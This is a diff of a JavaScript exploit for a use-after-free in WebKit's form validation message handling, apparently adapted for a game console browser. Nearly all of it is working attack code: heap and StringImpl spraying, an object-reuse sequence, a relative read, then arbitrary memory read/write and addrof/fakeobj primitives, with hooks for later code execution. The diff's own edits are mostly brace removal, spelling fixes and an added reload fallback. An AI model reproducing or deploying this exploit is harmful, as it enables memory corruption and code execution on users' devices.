@@ -44,20 +44,19 @@ var g_input = null;
 
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
 
+
 /* Executed after deleteBubbleTree */
 function setupRW() {
   /* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
   for (let i = 0; i < g_arr_ab_3.length; i++) {
     if (g_arr_ab_3[i].length > 0xff) {
       g_relative_rw = g_arr_ab_3[i];
-      debug_log("[+] Succesfully got a relative R/W");
+      debug_log("[+] Successfully got a relative R/W");
       break;
     }
   }
-
-  if (g_relative_rw === null) {
+  if (g_relative_rw === null)
     die("[!] Failed to setup a relative R/W primitive");
-  }
 
   debug_log("[+] Setting up arbitrary R/W");
 
@@ -67,11 +66,10 @@ function setupRW() {
 
   /* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
   let ab_index = g_jsview_leak.sub(ab_addr).low32();
-  if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER) {
+  if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
     g_ab_index = ab_index + LENGTH_JSVIEW;
-  } else {
+  else
     g_ab_index = ab_index - LENGTH_JSVIEW;
-  }
 
   /* Overding the length of one JSArrayBufferView with a known value */
   g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;
@@ -84,9 +82,8 @@ function setupRW() {
       break;
     }
   }
-  if (g_ab_slave === null) {
-    die("[!] Didn't found the slave JSArrayBufferView");
-  }
+  if (g_ab_slave === null)
+    die("[!] Didn't find the slave JSArrayBufferView");
 
   /* Extending the JSArrayBufferView length */
   g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
@@ -98,11 +95,10 @@ function setupRW() {
 
   let saved_vtable = read64(guess_htmltextarea_addr);
   write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
-  if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141")) {
+  if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
     die("[!] Failed to setup arbitrary R/W primitive");
-  }
 
-  debug_log("[+] Succesfully got arbitrary R/W!");
+  debug_log("[+] Successfully got arbitrary R/W!");
 
   /* Restore the overidden vtable pointer */
   write64(guess_htmltextarea_addr, saved_vtable);
@@ -113,30 +109,25 @@ function setupRW() {
   /* Set up addrof/fakeobj primitives */
   g_ab_slave.leakme = 0x1337;
   var bf = 0;
-  for(var i = 15; i >= 8; i--) {
+  for(var i = 15; i >= 8; i--)
     bf = 256 * bf + g_relative_rw[g_ab_index + i];
-  }
   g_jsview_butterfly = new Int64(bf);
-  if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337"))) {
+  if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
     die("[!] Failed to setup addrof/fakeobj primitives");
-  }
-  debug_log("[+] Succesfully got addrof/fakeobj");
+  debug_log("[+] Successfully got addrof/fakeobj");
 
   /* Getting code execution */
   /* ... */
-  if(window.postExploit) {
+  if(window.postExploit)
     window.postExploit();
-  }
 }
 
 function read(addr, length) {
-  for (let i = 0; i < 8; i++) {
+  for (let i = 0; i < 8; i++)
     g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
-  }
   let arr = [];
-  for (let i = 0; i < length; i++) {
+  for (let i = 0; i < length; i++)
     arr.push(g_ab_slave[i]);
-  }
   return arr;
 }
 
@@ -145,12 +136,10 @@ function read64(addr) {
 }
 
 function write(addr, data) {
-  for (let i = 0; i < 8; i++) {
+  for (let i = 0; i < 8; i++)
     g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
-  }
-  for (let i = 0; i < data.length; i++) {
+  for (let i = 0; i < data.length; i++)
     g_ab_slave[i] = data[i];
-  }
 }
 
 function write64(addr, data) {
@@ -189,18 +178,18 @@ function cleanup() {
  * and before deleteBubbleTree
  */
 function confuseTargetObjRound2() {
-  if (findTargetObj() === false) {
+  if (findTargetObj() === false)
     die("[!] Failed to reuse target obj.");
-  }
 
   g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
 
   setTimeout(setupRW, 6000);
 }
 
+
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-  debug_log("[+] Looking for the smashed StringImpl...");
+  debug_log("[+] Looking for the smashed StringImpl ...");
 
   var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
@@ -213,16 +202,17 @@ function leakJSC() {
       break;
     }
   }
-  if (g_relative_read === null) {
-    die("[!] Failed to setup a relative read primitive");
+  if (g_relative_read === null)  {
+    alert("[!] Failed to setup a relative read primitive\n\nDo not move your controller's analog sticks, and this error will happen less frequently.");
+    location.reload();
+    undefinedFunction();
   }
 
   debug_log("[+] Got a relative read");
 
-  var tmp_spray = {};
-  for(var i = 0; i < 100000; i++) {
-    tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
-  }
+        var tmp_spray = {};
+        for(var i = 0; i < 100000; i++)
+                tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
   let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -230,11 +220,10 @@ function leakJSC() {
   let tmp = [];
   for (let i = 0; i < 0x10000; i++) {
     /* The last allocated are more likely to be allocated after our relative read */
-    if (i >= 0xfc00) {
+    if (i >= 0xfc00)
       g_arr_ab_3.push(new Uint8Array(ab));
-    } else {
+    else
       tmp.push(new Uint8Array(ab));
-    }
   }
   tmp = null;
 
@@ -275,14 +264,13 @@ function leakJSC() {
           g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
           g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
           g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
-          g_relative_read.charCodeAt(i + 0x3f) === 0x00) {
+          g_relative_read.charCodeAt(i + 0x3f) === 0x00)
           v = new Int64(str2array(g_relative_read, 8, i + 0x20));
-        } else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
+        else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
           g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
           g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
-          g_relative_read.charCodeAt(i + 0x13) === 0x42) {
+          g_relative_read.charCodeAt(i + 0x13) === 0x42)
           v = new Int64(str2array(g_relative_read, 8, i + 8));
-          }
       }
       if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
         g_jsview_leak = v;
@@ -312,9 +300,8 @@ function confuseTargetObjRound1() {
   sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);
 
   /* Checking for leaked data */
-  if (findTargetObj() === false) {
+  if (findTargetObj() === false)
     die("[!] Failed to reuse target obj.");
-  }
 
   dumpTargetObj();
 
@@ -340,9 +327,8 @@ function reuseTargetObj() {
    * Free ValidationMessage neighboors.
    * SmallLine is freed -> SmallPage is cached
    */
-  for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++) {
+  for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
     g_frames[i].setAttribute("rows", ',');
-  }
 
   /* Get back target object */
   for (let i = 0; i < NB_REUSE; i++) {
@@ -412,17 +398,15 @@ function prepareUAF() {
   div.appendChild(g_input);
 
   /* First half spray */
-  for (let i = 0; i < NB_FRAMES / 2; i++) {
+  for (let i = 0; i < NB_FRAMES / 2; i++)
     g_frames[i].setAttribute("rows", g_rows1);
-  }
 
   /* Instantiate target obj */
   g_input.reportValidity();
 
   /* ... and the second half */
-  for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++) {
+  for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
     g_frames[i].setAttribute("rows", g_rows2);
-  }
 
   g_input.setAttribute("onfocus", "reuseTargetObj()");
   g_input.autofocus = true;
@@ -432,7 +416,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
   debug_log("[+] Spraying HTMLTextareaElement ...");
 
-  let textarea_div_elem = window.xyu = document.createElement("div");
+  let textarea_div_elem = document.createElement("div");
   document.body.appendChild(textarea_div_elem);
   textarea_div_elem.id = "div1";
   var element = document.createElement("textarea");
@@ -446,9 +430,8 @@ function sprayHTMLTextArea() {
    * Element. The virtual page layout will look something like that:
    * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
    */
-  for (let i = 0; i < SPRAY_ELEM_SIZE; i++) {
+  for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
     textarea_div_elem.appendChild(element.cloneNode());
-  }
 }
 
 /* StringImpl Spray */
@@ -463,9 +446,8 @@ function go() {
   /* Init spray */
   sprayHTMLTextArea();
 
-  if(window.midExploit) {
+  if(window.midExploit)
     window.midExploit();
-  }
 
   g_input = input1;
   /* Shape heap layout for obj. reuse */
